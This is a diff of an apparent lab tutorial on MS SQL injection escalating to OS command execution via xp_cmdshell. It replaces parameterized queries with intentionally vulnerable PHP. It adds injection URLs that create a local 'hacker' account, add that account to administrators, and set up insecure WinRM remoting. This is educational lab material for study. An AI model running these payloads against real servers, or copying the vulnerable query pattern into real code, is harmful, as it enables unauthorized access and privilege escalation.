@@ -42,7 +42,7 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
        "PWD" => "sa"           // SQL Server password
    );
    
-   // Establishes the connection
+   // Establish the connection to MSSQL Server
    $conn = sqlsrv_connect($serverName, $connectionOptions);
    
    // Check connection
@@ -50,62 +50,64 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
        die("Connection failed: " . print_r(sqlsrv_errors(), true));
    }
    
-   // Vulnerable input field: Sanitize input using parameterized queries
-   if (isset($_GET['id'])) {
-       $id = $_GET['id'];  // Vulnerable to SQL Injection without sanitization
+   ?>
    
-       // Prepare and execute the query securely using parameterized queries
-       $sql = "SELECT * FROM users WHERE id = ?";
-       $params = array($id);
-       $result = sqlsrv_query($conn, $sql, $params);
+   <!-- HTML Form for User Input (only showing 'ID' in the UI) -->
+   <h2>SQL Injection Vulnerable Web Application</h2>
+   <p>Enter a user ID to view details:</p>
    
-       // Check if the query executed successfully
-       if ($result === false) {
-           echo "SQL query failed!<br />";
-           die(print_r(sqlsrv_errors(), true));
-       }
+   <form action="vuln.php" method="GET">
+       <label for="input">User ID:</label>
+       <input type="text" id="input" name="input" placeholder="Enter User ID" />
+       <input type="submit" value="Submit" />
+   </form>
    
-       // Display results
-       while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
-           // Loop through all columns and display them
-           foreach ($row as $column => $value) {
-               echo "$column: $value<br />";
+   <?php
+   
+   // Check if the 'input' field has been set (this could be either an ID or command)
+   if (isset($_GET['input'])) {
+       $input = $_GET['input']; // This is the user input that could be used for SQL injection or command injection
+   
+       // First, try to execute as a SQL query (vulnerable to SQL injection)
+       $sql = "SELECT * FROM users WHERE id = '$input';"; // SQL injection vulnerability here
+       $result = sqlsrv_query($conn, $sql);
+   
+       if ($result !== false) {
+           // If SQL query succeeds, show the result
+           echo "<h3>Results:</h3>";
+           while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
+               foreach ($row as $column => $value) {
+                   echo "$column: $value<br />";
+               }
+               echo "<br />"; // Line break between rows
            }
-           echo "<br />"; // Line break between rows
-       }
    
-       sqlsrv_free_stmt($result);
+           sqlsrv_free_stmt($result);
+       } else {
+           // If SQL query fails, attempt to treat the input as a command for xp_cmdshell (vulnerable to command injection)
+           echo "<h3>Results:</h3>";
+           $sql = "EXEC xp_cmdshell '$input';"; // Command injection vulnerability here
+           $result = sqlsrv_query($conn, $sql);
+   
+           if ($result === false) {
+               echo "SQL query failed!<br />";
+               die(print_r(sqlsrv_errors(), true));
+           }
+   
+           // Display the output of the executed command
+           while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
+               foreach ($row as $value) {
+                   echo "$value<br />"; // Display the output of the executed command
+               }
+           }
+   
+           sqlsrv_free_stmt($result);
+       }
+   } else {
+       echo "Please provide an ID in the field above.<br />";
    }
    
-   // Command execution: Secure input for executing xp_cmdshell
-   if (isset($_GET['cmd'])) {
-       $cmd = $_GET['cmd'];
-   
-       // Log the command to the error log for debugging
-       error_log("Executing command: $cmd");
-   
-       // Prepare and execute the xp_cmdshell query
-       $sql = "EXEC xp_cmdshell ?";
-       $params = array($cmd);
-       $result = sqlsrv_query($conn, $sql, $params);
-   
-       // Check if the query executed successfully
-       if ($result === false) {
-           echo "SQL query failed!<br />";
-           die(print_r(sqlsrv_errors(), true));
-       }
-   
-       // Display the command output
-       while ($row = sqlsrv_fetch_array($result, SQLSRV_FETCH_ASSOC)) {
-           foreach ($row as $value) {
-               echo "$value<br />";  // Display the output of the executed command
-           }
-       }
-   
-       sqlsrv_free_stmt($result);
-   }
-   
-   // Close the database connection
+   // Close connection to the database
    sqlsrv_close($conn);
    ?>
    ```
@@ -171,17 +173,29 @@ Database applications like MySQL, MS SQL, and Oracle can execute system commands
 12. To inject `xp_cmdshell` into the query, use a dynamic SQL within the query as the following. The SQL Server interprets and run a dynamic SQL string which would not be blocked in a standard SQL query
     ```
     http://localhost/vulnsql/vuln.php?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
+    whoami
     ```
+    ![image](https://github.com/user-attachments/assets/e1b3a5b4-666f-430c-a7f7-791d17e43050)
 13. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings at the end of the web app's URL
     ```
     ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net user hacker hacked1337 /add'')';--
+    net user hacker hacked1337 /add
     ```
 14. To add this user to the local administrators group, add the following
     ```
     ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''net localgroup administrators hacker /add'')';--
+    net localgroup administrators hacker /add
     ```
-15. To verify `hacker` was added, check using the SQL injection string
-    ```
-    ?id=1'; EXEC sp_executesql N'EXEC xp_cmdshell(''whoami'')';--
-    ```
-16. 
+15. To verify `hacker` was added, check in cmd or PowerShell after adding the user
+    ![image](https://github.com/user-attachments/assets/6226b921-0ba3-490c-b937-aa8fdd775137)
+16. To test RDP into the server with the new malicious credentials, enable enable PowerShell remoting between a local and target VMs, and get the IP address of the target remote machine. Then set it as a trusted host on the local machine to allow remote connections. Run each of the commands below
+      ```      
+      winrm quickconfig -Force
+      Enable-PSRemoting -Force
+      Set-Item WSMan:\localhost\Client\TrustedHosts -Value "the_other_Windows_IP_Address1,the_other_Windows_IP_Address2"
+      Set-Item -force WSMan:\localhost\Client\AllowUnencrypted $true
+      Set-Item -force WSMan:\localhost\Service\AllowUnencrypted $true
+      Set-Item -force WSMan:\localhost\Client\Auth\Digest $true
+      Set-Item -force WSMan:\localhost\Service\Auth\Basic $true
+      ```
+    ![image](https://github.com/user-attachments/assets/d561c9d5-0463-400f-a8c2-724e2ae3d0c8)
